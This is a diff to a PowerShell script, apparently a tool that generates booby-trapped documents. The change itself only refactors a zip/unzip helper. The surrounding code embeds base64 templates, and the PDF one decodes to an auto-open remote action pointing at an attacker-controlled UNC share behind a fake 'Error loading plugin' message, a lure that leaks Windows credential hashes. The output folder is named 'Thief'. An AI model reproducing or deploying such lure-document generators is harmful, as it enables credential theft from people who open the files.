@@ -8,9 +8,21 @@ $xls_template = "UEsDBBQAAAAIAAAAIQB/0CPuVwEAAP0EAAATABwAW0NvbnRlbnRfVHlwZXNdLnh
 $pdf_template = "CiVQREYtMS43CgoxIDAgb2JqCjw8L1R5cGUvQ2F0YWxvZy9QYWdlcyAyIDAgUj4+CmVuZG9iagoyIDAgb2JqCjw8L1R5cGUvUGFnZXMvS2lkc1szIDAgUl0vQ291bnQgMT4+CmVuZG9iagozIDAgb2JqCjw8L1R5cGUvUGFnZS9QYXJlbnQgMiAwIFIvTWVkaWFCb3hbMCAwIDYxMiA3OTJdL1Jlc291cmNlczw8Pj4+PgplbmRvYmoKeHJlZgowIDQKMDAwMDAwMDAwMCA2NTUzNSBmCjAwMDAwMDAwMTUgMDAwMDAgbgowMDAwMDAwMDYwIDAwMDAwIG4KMDAwMDAwMDExMSAwMDAwMCBuCnRyYWlsZXIKPDwvU2l6ZSA0L1Jvb3QgMSAwIFI+PgpzdGFydHhyZWYKMTkwCjMgMCBvYmoKPDwgL1R5cGUgL1BhZ2UKICAgL0NvbnRlbnRzIDQgMCBSCgogICAvQUEgPDwKCSAgIC9PIDw8CgkgICAgICAvRiAoXFxcXHRhcmdldFxcQWRvYmVQbHVnaW4pCgkJICAvRCBbIDAgL0ZpdF0KCQkgIC9TIC9Hb1RvUgoJCSAgPj4KCgkgICA+PgoKCSAgIC9QYXJlbnQgMiAwIFIKCSAgIC9SZXNvdXJjZXMgPDwKCQkJL0ZvbnQgPDwKCQkJCS9GMSA8PAoJCQkJCS9UeXBlIC9Gb250CgkJCQkJL1N1YnR5cGUgL1R5cGUxCgkJCQkJL0Jhc2VGb250IC9IZWx2ZXRpY2EKCQkJCQk+PgoJCQkJICA+PgoJCQkJPj4KPj4KZW5kb2JqCgoKNCAwIG9iajw8IC9MZW5ndGggMTAwPj4Kc3RyZWFtCkJUCi9USV8wIDEgVGYKMTQgMCAwIDE0IDEwLjAwMCA3NTMuOTc2IFRtCjAuMCAwLjAgMC4wIHJnCihFcnJvciBsb2FkaW5nIHBsdWdpbikgVGoKRVQKZW5kc3RyZWFtCmVuZG9iagoKCnRyYWlsZXIKPDwKCS9Sb290IDEgMCBSCj4+CgolJUVPRgo="
 $destination = $temp+"Thief"
 
-Function zip($source,$destination) {
+Function zip($action,$source,$destination) {
   [Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
-  [System.IO.Compression.ZipFile]::CreateFromDirectory($source, $destination) 
+  
+  if ($action -eq "zip") {
+
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($source, $destination)
+
+  } elseif ($action -eq "unzip") {
+
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($source, $destination)
+
+  }
+   
+  
+  
 }
 
 
@@ -33,7 +45,7 @@ Function write_file ($content,$outfile) {
   else {
       $bytes = [Convert]::FromBase64String($content)
       [IO.File]::WriteAllBytes($destination+"/"+$outfile, $bytes) 
-      Expand-Archive $destination"/"$outfile -DestinationPath $destination"/wd/" -Force
+      zip "unzip" $destination"/"$outfile  $destination"/wd/" 
      
         if ($outfile.contains(".docx")) {
         
@@ -55,7 +67,7 @@ Function write_file ($content,$outfile) {
             Remove-Item "$pwd/$outfile"
         }
       
-      zip "$destination/wd/" "$pwd/$outfile" 
+      zip "zip" "$destination/wd/" "$pwd/$outfile" 
 
   }
  
